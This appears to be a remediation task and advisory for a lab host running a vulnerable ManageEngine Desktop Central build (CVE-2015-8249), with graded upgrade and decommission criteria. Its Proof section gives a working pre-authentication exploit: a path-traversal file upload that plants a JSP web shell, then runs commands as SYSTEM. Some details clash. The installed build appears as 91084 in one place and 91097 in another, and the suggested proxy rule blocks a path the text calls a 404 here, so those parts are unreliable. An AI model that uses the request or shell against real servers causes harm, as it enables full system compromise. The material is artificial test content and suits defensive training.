# ManageEngine Desktop Central 9 — FileUploadServlet Arbitrary File Upload (CVE-2015-8249)

## Severity
**Critical** (CVSS 9.8)

## CVE
- **CVE-2015-8249** — Pre-authentication arbitrary file upload in the `FileUploadServlet`
  endpoint of ManageEngine Desktop Central prior to build 91100, leading directly to
  RCE as the Desktop Central service account (`LocalSystem` by default).
- Publicly weaponized as Metasploit module
  `exploit/windows/http/manageengine_connectionid_write`.

## Description
Desktop Central's `FileUploadServlet` accepts unauthenticated uploads and concatenates
the caller-supplied `connectionId` parameter into a filesystem path without
canonicalization. An attacker supplies a `connectionId` containing path-traversal
segments and a `.jsp` body; the servlet writes the request body to a directory served
by the bundled Tomcat and the JSP is executed on next request.

The Rapid7 mirror this image installs from serves a version-less object; what it
actually lays down reports `buildnumber=91084` in `conf\product.conf`, sixteen builds
behind the fix (91100). The admin console is left on 8020/TCP bound to `0.0.0.0`.

## Affected Service
- **Install root:** `C:\ManageEngine\DesktopCentral_Server` (bundled Tomcat + PostgreSQL)
- **Services:** `DesktopCentralServer`, `MEDCServerComponent-Apache`,
  `MEDC Server Component - Notification Server`
- **How it is actually running here:** all three services are ordinary Windows services,
  started by the container's CMD and left Running. `DesktopCentralServer` is the Tanuki
  wrapper plus the product JVM; `MEDCServerComponent-Apache` is the front-end httpd that
  owns **8020** and reverse-proxies to the JVM. Stopping the core service alone leaves
  Apache answering 8020 with a 503, which is not a decommission -- the listener, not the
  service state, is what is graded.
- **Ports:** 8020/TCP (admin UI, via the bundled Apache), 8027/TCP (notification
  server). The 8040/TCP agent channel is not bound in this build.
- **Vulnerable endpoint:** `POST /fileupload?connectionId=...` — this is the real
  mapping. `webapps\DesktopCentral\WEB-INF\web.xml` binds `<url-pattern>/fileupload`
  to `com.adventnet.sym.webclient.common.FileUploadServlet`; the
  `/agent/connection/download/FileUploadServlet` path quoted by some CVE write-ups is
  **404 here**.

## Proof
`doPost` reads five parameters, and all five matter: `customerId` goes through
`Long.parseLong`, so a request that omits it throws before anything is written, and
`getFileFolderPath()` only produces a path when `action` is `rds_file_upload`. The
request body is copied straight from `request.getInputStream()` — it is never parsed
as multipart, so no MIME framing is required.

```
POST /fileupload?connectionId=../../../../../../shell.jsp%00&resourceId=1&action=rds_file_upload&computerName=X&customerId=1 HTTP/1.1
Host: <target>:8020
Content-Type: application/octet-stream
Content-Length: ...

<%@ page import="java.util.*,java.io.*"%><% Runtime.getRuntime().exec(request.getParameter("c")); %>
```
The servlet writes to
`<serverDataDir>\rds\scr-rec\<user>-<computerName>-<connectionId>.7z`. Because
`<user>-<computerName>-` is glued to the front of `connectionId`, the first `../`
only cancels that prefix, so **six** are needed to climb out of
`webapps\DesktopCentral\server-data\<customerId>\rds\scr-rec` into
`webapps\DesktopCentral`. The trailing `.7z` is truncated by the bundled JRE's
null byte handling, so the file lands as a real `.jsp`.

Then `GET /shell.jsp?c=whoami` runs as `NT AUTHORITY\SYSTEM`.

## Remediation Steps

No configuration change brings 9.1.0_91097 into a safe state; the fix is a build
upgrade, or removal. Exactly one of the following two must be achieved.

1. **Upgrade to DC build ≥ 91100** (the real-world fix — the current supported line is
   Desktop Central build 10.1.2137.x+). ManageEngine ships upgrades as signed `.ppm`
   service packs applied through the bundled update manager:
   ```powershell
   & 'C:\ManageEngine\DesktopCentral_Server\bin\UpdateManager.bat' -c -f ppm_9.1.0_91100.ppm
   ```
   The build in force is recorded as `buildnumber=` in
   `C:\ManageEngine\DesktopCentral_Server\conf\product.conf` and echoed by the admin UI.
   **This host has no outbound network access and no `.ppm` service pack is staged on
   it**, so unless you can produce a genuine 91100+ package from something already on the
   box, this path is not available here — and editing `product.conf` to claim a build
   number the code does not correspond to leaves the traversal upload wide open, which is
   probed directly.

2. **Decommission the product.** Desktop Central is not this host's reason to exist, and
   removing it is a complete and accepted fix. To count, *all three* must hold:
   - the `DesktopCentralServer` service is not Running,
   - nothing is listening on **8020/TCP**, and
   - nothing is listening on **8040/TCP**.

   Desktop Central is three cooperating services (see *Affected Service* above) and the
   one named `DesktopCentralServer` is not the one holding 8020. Stopping it alone leaves
   `MEDCServerComponent-Apache` bound to 8020 and answering 503, so the port is still
   open and the box is still not decommissioned -- stop and disable every ManageEngine
   service, and make sure no listener is left on 8020 or on the 8040 agent channel.
   There are no firewall rules to remove -- the host firewall is off.

   Decommissioning removes the product, not the machine: `sshd` (22) and `WinRM` (5985)
   are the operator's access to this host and must still be Running when you are done.

3. **Compensating control (only if the upgrade must be deferred):** front the admin and
   agent endpoints with a reverse proxy that rejects any request to
   `/agent/connection/download/FileUploadServlet` from unauthenticated sources. This
   is *not* accepted as remediation — it is listed for production guidance.
